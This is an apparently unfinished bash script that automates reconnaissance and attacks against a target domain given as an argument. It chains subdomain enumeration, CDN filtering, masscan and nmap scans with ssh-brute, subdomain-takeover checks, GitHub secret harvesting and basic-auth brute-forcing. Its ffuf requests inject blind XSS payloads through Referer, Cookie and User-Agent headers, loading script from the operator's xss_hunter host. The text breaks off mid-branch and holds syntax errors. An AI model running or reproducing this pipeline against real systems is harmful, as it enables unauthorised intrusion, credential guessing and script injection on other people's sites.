#!/bin/bash

passwordx=$(cat ~/tools/.creds | grep password | awk {'print $3'})
dns_server=$(cat ~/tools/.creds | grep 'dns_server' | awk {'print $3'})
xss_hunter=$(cat ~/tools/.creds | grep 'xss_hunter' | awk {'print $3'})

[ ! -f ~/recon ] && mkdir ~/recon  2&>1 
[ ! -f ~/recon/$1 ] && mkdir ~/recon/$1  2&>1
[ ! -f ~/recon/$1/webanalyze ] && mkdir ~/recon/$1/webanalyze  2&>1
[ ! -f ~/recon/$1/aquatone ] && mkdir ~/recon/$1/aquatone  2&>1
[ ! -f ~/recon/$1/shodan ] && mkdir ~/recon/$1/shodan  2&>1
[ ! -f ~/recon/$1/dirsearch ] && mkdir ~/recon/$1/dirsearch  2&>1
[ ! -f ~/recon/$1/virtual-hosts ] && mkdir ~/recon/$1/virtual-hosts  2&>1
[ ! -f ~/recon/$1/endpoints ] && mkdir ~/recon/$1/endpoints  2&>1
[ ! -f ~/recon/$1/github-endpoints ] && mkdir ~/recon/$1/github-endpoints  2&>1
[ ! -f ~/recon/$1/github-secrets ] && mkdir ~/recon/$1/github-secrets  2&>1
[ ! -f ~/recon/$1/gau ] && mkdir ~/recon/$1/gau  2&>1
[ ! -f ~/recon/$1/kxss ] && mkdir ~/recon/$1/kxss  2&>1
[ ! -f ~/recon/$1/http-desync ] && mkdir ~/recon/$1/http-desync  2&>1
[ ! -f ~/recon/$1/401 ] && mkdir ~/recon/$1/401  2&>1
sleep 5

folder=$1

message () {
	telegram_bot=$(cat ~/tools/.creds | grep "telegram_bot" | awk {'print $3'})
	telegram_id=$(cat ~/tools/.creds | grep "telegram_id" | awk {'print $3'})
	alert="https://api.telegram.org/bot$telegram_bot/sendmessage?chat_id=$telegram_id&text="
	[ -z $telegram_bot ] && [ -z $telegram_id ] || curl -g $alert$1 --silent > /dev/null
}

scanned () {
	cat $1 | sort -u | wc -l
}

message "[%2B]%20Initiating%20scan%20%3A%20$1%20[%2B]"
date

[ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt

if [ ! -f ~/recon/$1/$1-final.txt ]; then
	echo "[+] AMASS SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-amass.txt ] && [ ! -z $(which amass) ]; then
		amass enum -brute -w ~/tools/EnormousDNS.txt -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
		amasscan=$(scanned ~/recon/$1/$1-amass.txt)
		message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$1"
		echo "[+] Amass Found $amasscan subdomains"
	else
		message "[-]%20Skipping%20Amass%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5

	echo "[+] FINDOMAIN SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-findomain.txt ] && [ ! -z $(which findomain) ]; then
		findomain -t $1 -q -u ~/recon/$1/$1-findomain.txt
		findomainscan=$(scanned ~/recon/$1/$1-findomain.txt)
		message "Findomain%20Found%20$findomainscan%20subdomain(s)%20for%20$1"
		echo "[+] Findomain Found $findomainscan subdomains"
	else
		message "[-]%20Skipping%20Findomain%20$findomainscan%20previously%20discovered%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5

	echo "[+] SUBFINDER SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-subfinder.txt ] && [ ! -z $(which subfinder) ]; then
		subfinder -d $1 -nW -silent -rL ~/tools/nameservers.txt -o ~/recon/$1/$1-subfinder.txt
		subfinderscan=$(scanned ~/recon/$1/$1-subfinder.txt)
		message "SubFinder%20Found%20$subfinderscan%20subdomain(s)%20for%20$1"
		echo "[+] Subfinder Found $subfinderscan subdomains"
	else
		message "[-]%20Skipping%20Subfinder%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5

	echo "[+] ASSETFINDER SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-assetfinder.txt ] && [ ! -z $(which assetfinder) ]; then
		assetfinder -subs-only $1 > ~/recon/$1/$1-assetfinder.txt
		assetfinderscan=$(scanned ~/recon/$1/$1-assetfinder.txt)
		message "Assetfinder%20Found%20$assetfinderscan%20subdomain(s)%20for%20$1"
		echo "[+] Assetfinder Found $assetfinderscan subdomains"
	else
		message "[-]%20Skipping%20Assetfinder%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5

	echo "[+] SCANNING SUBDOMAINS WITH PROJECT SONAR [+]"
	if [ ! -f ~/recon/$1/$1-project-sonar.txt ] && [ -e ~/tools/forward_dns.any.json.gz ]; then
		zcat ~/tools/forward_dns.any.json.gz | grep -E "\.$1\"," | jq -r '.name' | sort -u >> ~/recon/$1/$1-project-sonar.txt
		projectsonar=$(scanned ~/recon/$1/$1-project-sonar.txt)
		message "Project%20Sonar%20Found%20$projectsonar%20subdomain(s)%20for%20$1"
		echo "[+] Project Sonar Found $projectsonar subdomains"
	else
		message "[-]%20Skipping%20Project%20Sonar%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5

	## Deleting all the results to less disk usage
	cat ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-assetfinder.txt | sort -uf > ~/recon/$1/$1-final.txt
	rm ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-assetfinder.txt
	sleep 5

fi

if [ ! -f ~/recon/$1/$1-final.txt ]; then
	exit 1
fi

echo "[+] GOALTDNS SUBDOMAIN PERMUTATION [+]"
if [ ! -f ~/recon/$1/$1-goaltdns.txt ] && [ ! -z $(which goaltdns) ]; then
	goaltdns -l ~/recon/$1/$1-final.txt -w ~/tools/subs.txt | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r '.name' >> ~/recon/$1/$1-goaltdns.tmp
	cat ~/recon/$1/$1-goaltdns.tmp | sed 's/\.$//g' | sort -u >> ~/recon/$1/$1-goaltdns.txt
	rm ~/recon/$1/$1-goaltdns.tmp
	goaltdns=$(scanned ~/recon/$1/$1-goaltdns.txt)
	message "goaltdns%20generates%20$goaltdns%20subdomain(s)%20for%20$1"
	echo "[+] goaltdns generate $goaltdns subdomains"
else
	message "[-]%20Skipping%20goaltdns%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] ELIMINATING WILDCARD SUBDOMAINS [+]"
if [ ! -f ~/recon/$1/$1-non-wildcards.txt ] && [ ! -z $(which shuffledns) ] && [ ! -z $(which dnsprobe) ]; then
	cat ~/recon/$1/$1-goaltdns.txt ~/recon/$1/$1-final.txt | sed 's/\.$//g' | shuffledns -d $1 -r ~/tools/nameservers.txt | dnsprobe -r A | awk {'print $1'} | sort -u >> ~/recon/$1/$1-non-wildcards.txt
	rm ~/recon/$1/$1-final.txt && mv ~/recon/$1/$1-non-wildcards.txt ~/recon/$1/$1-final.txt
	message "Done%20Eliminating%20wildcard%20subdomains!"
else
	message "[-]%20Skipping%20shuffledns%20and%20dnsprobe%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

all=$(scanned ~/recon/$1/$1-final.txt)
message "Almost%20$all%20Collected%20Subdomains%20for%20$1"
echo "[+] $all collected subdomains"
sleep 3

# collecting all IP from collected subdomains
echo "[+] Getting all IP from subdomains [+]"
if [ ! -f ~/recon/$1/$1-ipz.txt ] && [ ! -z $(which dnsprobe) ]; then
	cat ~/recon/$1/$1-final.txt | dnsprobe | awk {'print $2'} | sort -u > ~/recon/$1/$1-ipz.txt
	rm ~/recon/$1/$1-goaltdns.txt
	ipcount=$(scanned ~/recon/$1/$1-ipz.txt)
	message "Almost%20$ipcount%20IP%20Collected%20in%20$1"
	echo "[+] $all collected IP"
else
	message "[-]%20Skipping%20dnsprobe%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi

## segregating cloudflare IP from non-cloudflare IP
## non-sense if I scan cloudflare,sucuri,akamai and incapsula IP. :(
iprange="173.245.48.0/20 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 141.101.64.0/18 108.162.192.0/18 190.93.240.0/20 188.114.96.0/20 197.234.240.0/22 198.41.128.0/17 162.158.0.0/15 104.16.0.0/12 172.64.0.0/13 131.0.72.0/22"
for ip in $(cat ~/recon/$1/$1-ipz.txt); do
	grepcidr "$iprange" <(echo "$ip") >/dev/null && echo "[!] $ip is cloudflare" || echo "$ip" >> ~/recon/$1/$1-ip4.txt
done
ipz=$(scanned ~/recon/$1/$1-ip4.txt)
ip_old=$(scanned ~/recon/$1/$1-ipz.txt)
message "$ipz%20non-cloudflare%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-cloudflare IPs has been collected out of $ip_old IPs!"
rm ~/recon/$1/$1-ipz.txt
sleep 5

incapsula="199.83.128.0/21 198.143.32.0/19 149.126.72.0/21 103.28.248.0/22 45.64.64.0/22 185.11.124.0/22 192.230.64.0/18 107.154.0.0/16 45.60.0.0/16 45.223.0.0/16"
for ip in $(cat ~/recon/$1/$1-ip4.txt); do
	grepcidr "$incapsula" <(echo "$ip") >/dev/null && echo "[!] $ip is Incapsula" || echo "$ip" >> ~/recon/$1/$1-ip3.txt
done
ipz=$(scanned ~/recon/$1/$1-ip3.txt)
ip_old=$(scanned ~/recon/$1/$1-ip4.txt)
message "$ipz%20non-incapsula%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-incapsula IPs has been collected out of $ip_old IPs!"
rm ~/recon/$1/$1-ip4.txt
sleep 5

sucuri="185.93.228.0/24 185.93.229.0/24 185.93.230.0/24 185.93.231.0/24 192.124.249.0/24 192.161.0.0/24 192.88.134.0/24 192.88.135.0/24 193.19.224.0/24 193.19.225.0/24 66.248.200.0/24 66.248.201.0/24 66.248.202.0/24 66.248.203.0/24"
for ip in $(cat ~/recon/$1/$1-ip3.txt); do
	grepcidr "$sucuri" <(echo "$ip") >/dev/null && echo "[!] $ip is Sucuri" || echo "$ip" >> ~/recon/$1/$1-ip2.txt
done
ipz=$(scanned ~/recon/$1/$1-ip2.txt)
ip_old=$(scanned ~/recon/$1/$1-ip3.txt)
message "$ipz%20non-sucuri%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-sucuri IPs has been collected out of $ip_old IPs!"
rm ~/recon/$1/$1-ip3.txt
sleep 5

akamai="104.101.221.0/24 184.51.125.0/24 184.51.154.0/24 184.51.157.0/24 184.51.33.0/24 2.16.36.0/24 2.16.37.0/24 2.22.226.0/24 2.22.227.0/24 2.22.60.0/24 23.15.12.0/24 23.15.13.0/24 23.209.105.0/24 23.62.225.0/24 23.74.29.0/24 23.79.224.0/24 23.79.225.0/24 23.79.226.0/24 23.79.227.0/24 23.79.229.0/24 23.79.230.0/24 23.79.231.0/24 23.79.232.0/24 23.79.233.0/24 23.79.235.0/24 23.79.237.0/24 23.79.238.0/24 23.79.239.0/24 63.208.195.0/24 72.246.0.0/24 72.246.1.0/24 72.246.116.0/24 72.246.199.0/24 72.246.2.0/24 72.247.150.0/24 72.247.151.0/24 72.247.216.0/24 72.247.44.0/24 72.247.45.0/24 80.67.64.0/24 80.67.65.0/24 80.67.70.0/24 80.67.73.0/24 88.221.208.0/24 88.221.209.0/24 96.6.114.0/24"
for ip in $(cat ~/recon/$1/$1-ip2.txt); do
	grepcidr "$akamai" <(echo "$ip") >/dev/null && echo "[!] $ip is Akamai" || echo "$ip" >> ~/recon/$1/$1-ip.txt
done
ipz=$(scanned ~/recon/$1/$1-ip.txt)
ip_old=$(scanned ~/recon/$1/$1-ip2.txt)
message "$ipz%20non-akamai%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-akamai IPs has been collected out of $ip_old IPs!"
rm ~/recon/$1/$1-ip2.txt
sleep 5

if [ $2 = "portscan" ]; then
	echo "[+] MASSCAN PORT SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-masscan.txt ] && [ ! -z $(which masscan) ]; then
		echo $passwordx | sudo -S masscan -p0-65535 -iL ~/recon/$1/$1-ip.txt --max-rate 1000 -oG ~/recon/$1/$1-masscan.txt
		mass=$(cat ~/recon/$1/$1-masscan.txt | grep "Host:" | awk {'print $5'} | awk -F '/' {'print $1'} | sort -u | wc -l)
		message "Masscan%20discovered%20$mass%20open%20port(s)%20for%20$1"
		echo "[+] Done masscan for scanning port(s)"
	else
		message "[-]%20Skipping%20Masscan%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5
	
	big_ports=$(cat ~/recon/$1/$1-masscan.txt | grep "Host:" | awk {'print $5'} | awk -F '/' {'print $1'} | sort -u | paste -s -d ',')
	cat ~/recon/$1/$1-masscan.txt | grep "Host:" | awk {'print $2":"$5'} | awk -F '/' {'print $1'} | sed 's/:80$//g' | sed 's/:443$//g' | sort -u > ~/recon/$1/$1-open-ports.txt  
	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt > ~/recon/$1/$1-all.txt
fi


echo "[+] HTTProbe Scanning Alive Hosts [+]"
if [ ! -f ~/recon/$1/$1-httprobe.txt ] && [ ! -z $(which httprobe) ]; then
	cat ~/recon/$1/$1-all.txt | httprobe -c 100 >> ~/recon/$1/$1-httprobe.txt
	alivesu=$(scanned ~/recon/$1/$1-httprobe.txt)
	message "$alivesu%20alive%20domains%20out%20of%20$all%20domains%20in%20$1"
	echo "[+] $alivesu alive domains out of $all domains/IPs using httprobe"
else
	message "[-]%20Skipping%20httprobe%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u > ~/recon/$1/$1-alive.txt

echo "[+] S3 Bucket Scanner [+]"
if [ -f ~/tools/S3Scanner/s3scanner.py ]; then
	python ~/tools/S3Scanner/s3scanner.py ~/recon/$1/$1-alive.txt &> ~/recon/$1/$1-s3scanner.txt
	esthree=$(cat ~/recon/$1/$1-s3scanner.txt | grep "\[found\]" | wc -l)
	message "S3Scanner%20found%20$esthree%20buckets%20for%20$1"
	echo "[+] Done s3scanner for $1"
else
	message "[-]%20Skipping%20s3scanner%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi

echo "[+] TKO-SUBS for Subdomain TKO [+]"
if [ ! -f ~/recon/$1/$1-tkosubs.txt ] && [ ! -z $(which tko-subs) ]; then
	[ ! -f ~/tools/providers-data.csv ] && wget "https://raw.githubusercontent.com/anshumanbh/tko-subs/master/providers-data.csv" -O ~/tools/providers-data.csv
	tko-subs -domains=recon/$1/$1-alive.txt -data=/root/tools/providers-data.csv -output=/root/recon/$1/$1-tkosubs.txt
	message "TKO-Subs%20scanner%20done%20for%20$1"
	echo "[+] TKO-Subs scanner is done"
else
	message "[-]%20Skipping%20tko-subs%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] SUBJACK for Subdomain TKO [+]"
if [ ! -f ~/recon/$1/$1-subjack.txt ] && [ ! -z $(which subjack) ]; then
	[ ! -f ~/tools/fingerprints.json ] && wget "https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json" -O ~/tools/fingerprints.json
	subjack -w ~/recon/$1/$1-alive.txt -a -timeout 15 -c ~/tools/fingerprints.json -v -m -o ~/recon/$1/$1-subtemp.txt
	subjack -w ~/recon/$1/$1-alive.txt -a -timeout 15 -c ~/tools/fingerprints.json -v -m -ssl -o ~/recon/$1/$1-subtmp.txt
	cat ~/recon/$1/$1-subtemp.txt ~/recon/$1/$1-subtmp.txt | sort -u > ~/recon/$1/$1-subjack.txt
	rm ~/recon/$1/$1-subtemp.txt ~/recon/$1/$1-subtmp.txt
	message "subjack%20scanner%20done%20for%20$1"
	echo "[+] Subjack scanner is done"
else
	message "[-]%20Skipping%20subjack%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] COLLECTING ENDPOINTS [+]"
if [ -f ~/tools/LinkFinder/linkfinder.py ]; then
	for urlz in $(cat ~/recon/$1/$1-httprobe.txt); do 
		filename=$(echo $urlz | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		link=$(python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli | grep -E "*.js$" | grep "$1" | grep "Running against:" |awk {'print $3'})
		echo "Running against: $urlz"
		if [[ ! -z $link ]]; then
			for linx in $link; do
				python ~/tools/LinkFinder/linkfinder.py -i $linx -o cli > ~/recon/$1/endpoints/$filename-result.txt
			done
		else
			python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli > ~/recon/$1/endpoints/$filename-result.txt
		fi
	done
	message "Done%20collecting%20endpoint%20in%20$1"
	echo "[+] Done collecting endpoint"
else
	message "[-]%20Skipping%20linkfinder%20Scanning%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] COLLECTING ENDPOINTS FROM GITHUB [+]"
if [ -e ~/tools/.tokens ] && [ -f ~/tools/.tokens ] && [ -f ~/tools/github-endpoints.py ]; then
	for url in $(cat ~/recon/$1/$1-alive.txt); do 
		echo "Running against: $url"
		python3 ~/tools/github-endpoints.py -d $url -s -r -t $(cat ~/tools/.tokens) > ~/recon/$1/github-endpoints/$url.txt
		sleep 7
	done
	message "Done%20collecting%20github%20endpoint%20in%20$1"
	echo "[+] Done collecting github endpoint"
else
	message "Skipping%20github-endpoint%20script%20in%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] COLLECTING SECRETS FROM GITHUB [+]"
if [ -e ~/tools/.tokens ] && [ -f ~/tools/.tokens ] && [ -f ~/tools/github-secrets.py ]; then
	for url in $(cat ~/recon/$1/$1-alive.txt ); do 
		u=$(echo $url | sed 's/\./\\./g');
		echo "Running against: $url"
		python3 ~/tools/github-secrets.py -s $u -t $(cat ~/tools/.tokens) > ~/recon/$1/github-secrets/$url.txt
		sleep 7
	done
	message "Done%20collecting%20github%20secrets%20in%20$1"
	echo "[+] Done collecting github secrets"
else
	message "Skipping%20github-secrets%20script%20in%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] HTTP SMUGGLING SCANNING [+]"
if [ -f ~/tools/smuggler.py ]; then
	for url in $(cat ~/recon/$1/$1-httprobe.txt); do
		filename=$(echo $url | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		echo "Running against: $url"
		python3 ~/tools/smuggler.py -u "$url/" -v 1 -l ~/recon/$1/http-desync/$filename.txt --no-color
	done
	message "Done%20scanning%20of%20request%20smuggling%20in%20$1"
	echo "[+] Done scanning of request smuggling"
else
	message "Skipping%20scanning%20of%20request%20smuggling%20in%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] ZDNS SCANNING [+]"
if [ ! -z $(which zdns) ]; then
	for i in $(cat ~/recon/$1/$1-alive.txt);do echo $i | zdns ANY --name-servers=8.8.8.8,8.8.4.4 -output-file - | jq -r '"Name: "+.name+"\t\t Protocol: "+.data.protocol+"\t Resolver: "+.data.resolver+"\t Status: "+.status' >> ~/recon/$1/$1-zdns.txt;done
	message "Done%20ZDNS%20Scanning%20for%20$1"
	echo "[+] Done ZDNS for scanning assets"
else
	message "Skipping%20scanning%20of%20ZDNS%20in%20$1"
	echo "[!] Skipping ..."	
fi
sleep 5

echo "[+] SHODAN HOST SCANNING [+]"
if [ ! -z $(which shodan) ]; then
	for ip in $(cat ~/recon/$1/$1-ip.txt); do filename=$(echo $ip | sed 's/\./_/g');shodan host $ip > ~/recon/$1/shodan/$filename.txt; done
	message "Done%20Shodan%20for%20$1"
	echo "[+] Done shodan"
else
	message "[-]%20Skipping%20Shodan%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5	

echo "[+] AQUATONE SCREENSHOT [+]"
if [ ! -z $(which aquatone) ]; then
	cat ~/recon/$1/$1-httprobe.txt | aquatone -ports $big_ports -out ~/recon/$1/aquatone
	message "Done%20Aquatone%20for%20Screenshot%20for%20$1"
	echo "[+] Done aquatone for screenshot of Alive assets"
else
	message "[-]%20Skipping%20Aquatone%20Screenshot%20for%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

if[ $2 == "portscan" ]; then
	echo "[+] NMAP PORT SCANNING [+]"
	if [ ! -f ~/recon/$1/$1-nmap.txt ] && [ ! -z $(which nmap) ]; then
		[ ! -f ~/tools/nmap-bootstrap.xsl ] && wget "https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl" -O ~/tools/nmap-bootstrap.xsl
		echo $passwordx | sudo -S nmap -sSVC -A -O -Pn -p$big_ports -iL ~/recon/$1/$1-ip.txt --script http-enum,http-title,ssh-brute --stylesheet ~/tools/nmap-bootstrap.xsl -oA ~/recon/$1/$1-nmap
		nmaps=$(scanned ~/recon/$1/$1-ip.txt)
		xsltproc -o ~/recon/$1/$1-nmap.html ~/tools/nmap-bootstrap.xsl ~/recon/$1/$1-nmap.xml
		message "Nmap%20Scanned%20$nmaps%20IPs%20for%20$1"
		echo "[+] Done nmap for scanning IPs"
	else
		message "[-]%20Skipping%20Nmap%20Scanning%20for%20$1"
		echo "[!] Skipping ..."
	fi
	sleep 5
fi

echo "[+] WEBANALYZE SCANNING FOR FINGERPRINTING [+]"
if [ ! -z $(which webanalyze) ]; then
	[ ! -f ~/tools/apps.json ] && wget "https://raw.githubusercontent.com/AliasIO/Wappalyzer/master/src/apps.json" -O ~/tools/apps.json
	for target in $(cat ~/recon/$1/$1-httprobe.txt); do
		filename=$(echo $target | sed 's/http\(.?*\)*:\/\///g')
		webanalyze -host $target -apps ~/tools/apps.json -output csv > ~/recon/$1/webanalyze/$filename.txt
		sleep 5
	done
	message "Done%20webanalyze%20for%20fingerprinting%20$1"
	echo "[+] Done webanalyze for fingerprinting the assets!"
else
	message "[-]%20Skipping%20webanalyze%20for%20fingerprinting%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] ALIENVAULT, WAYBACKURLS and COMMON CRAWL Scanning for Archived Endpoints [+]"
if [ ! -z $(which gau) ]; then
	for u in $(cat ~/recon/$1/$1-alive.txt);do echo $u | gau | grep "$u" >> ~/recon/$1/gau/tmp-$u.txt; done
	cat ~/recon/$1/gau/* | sort -u | getching >> ~/recon/$1/gau/$1-gau.txt 
	rm ~/recon/$1/gau/tmp-*
	message "GAU%20Done%20for%20$1"
	echo "[+] Done gau for discovering useful endpoints"
else
	message "[-]%20Skipping%20GAU%20for%20fingerprinting%20$1"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] DALFOX for injecting blindxss"
if [ ! -z $(which dalfox) ]; then
	 cat ~/recon/$1/$1-alive.txt | gau | grep "=" | dalfox pipe -b $xss_hunter -o ~/recon/$1/$1-dalfox.txt
	message "DALFOX%20Done%20for%20$1"
	echo "[+] Done dalfox for injecting blind xss"
else
	message "[-]%20Skipping%20DALFOX%20for%20injecting%20blind%20xss%20in%20$1"
	echo "[!] Skipping ..."	
fi
sleep 5

echo "[+] KXSS for potential vulnerable xss"
if [ ! -z $(which kxss) ]; then
	 cat ~/recon/$1/$1-alive.txt | gau | grep "=" | kxss | grep "is reflected and allows" | awk {'print $9'} | sort -u >> ~/recon/$1/kxss/$1-kxss.txt
	message "KXSS%20Done%20for%20$1"
	echo "[+] Done kxss for potential xss"
else
	message "[-]%20Skipping%20KXSS%20for%20potential%20kxss%20in%20$1"
	echo "[!] Skipping ..."	
fi
sleep 5

echo "[+] 401 Scanning"
[ ! -f ~/tools/basic_auth.txt ] && wget https://raw.githubusercontent.com/phspade/Combined-Wordlists/master/basic_auth.txt -O ~/tools/basic_auth.txt
if [ ! -z $(which ffuf) ]; then
	for i in $(cat ~/recon/$1/$1-httprobe.txt); do
		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
		if [ 401 == $stat_code ]; then
			ffuf -c -w ~/tools/basic_auth.txt -u $i -k -r -H "Authorization: Basic FUZZ" -mc all -fc 500-599,401 -of html -o ~/recon/$1/401/$filename-basic-auth.html 
		else
			echo "$stat_code >> $i"
		fi
	done
	message "401%20Scan%20Done%20for%20$1"
	echo "[+] Done 401 Scanning for $1"
else
	message "[-]%20Skipping%20ffuf%20for%20401%20scanning"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] Scanning for Virtual Hosts Resolution [+]"
if [ ! -z $(which ffuf) ]; then
	[ ! -f ~/tools/virtual-host-scanning.txt ] && wget "https://raw.githubusercontent.com/codingo/VHostScan/master/VHostScan/wordlists/virtual-host-scanning.txt" -O ~/tools/virtual-host-scanning.txt
	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt ~/tools/virtual-host-scanning.txt | sed "s/\%s/$1/g" | sort -u >> ~/recon/$1/$1-temp-vhost-wordlist.txt
	for target in $(cat ~/recon/$1/$1-alive.txt); do ffuf -c -w ~/recon/$1/$1-temp-vhost-wordlist.txt -u http://$target -k -r -H "Host: FUZZ" -H "X-Forwarded-For: $target.scanner.xforwarded.$dns_server" -H "X-Real-IP: $target.scanner.xrealip.$dns_server" -H "X-Originating-IP: $target.scanner.xoriginatingip.$dns_server" -H "Client-IP: $target.scanner.clientip.$dns_server" -H "CF-Connecting_IP: $target.scanner.cfconnectingip.$dns_server" -H "Forwarded: for=$target.scanner.for-forwarded.$dns_server;by=$target.scanner.by-forwarded.$dns_server;host=$target.scanner.host-forwarded.$dns_server" -H "X-Client-IP: $target.scanner.xclientip.$dns_server" -H "True-Client-IP: $target.scanner.trueclientip.$dns_server" -H "X-Forwarded-Host: $target.scanner.xforwardedhost.$dns_server" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -H "User-Agent: %22%27%3Eblahblah%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2Fscript%3Etesting" -mc all -fc 500-599,400,406,301 -of html -o ~/recon/$1/virtual-hosts/$target.html; done
	message "Virtual%20Host%20done%20for%20$1"
	echo "[+] Done ffuf for scanning virtual hosts"
else
	message "[-]%20Skipping%20ffuf%20for%20vhost%20scanning"
	echo "[!] Skipping ..."
fi
rm ~/recon/$1/$1-temp-vhost-wordlist.txt
sleep 5

echo "[+] Dir and Files Scanning for Sensitive Files [+]"
if [ ! -z $(which ffuf) ]; then
	for i in $(cat ~/recon/$1/$1-httprobe.txt); do
		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
		if [ 404 == $stat_code ]; then
			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
		elif [ 403 == $stat_code ]; then
			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
		elif [ 401 == $stat_code ]; then
			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
		elif [ 200 == $stat_code ]; then
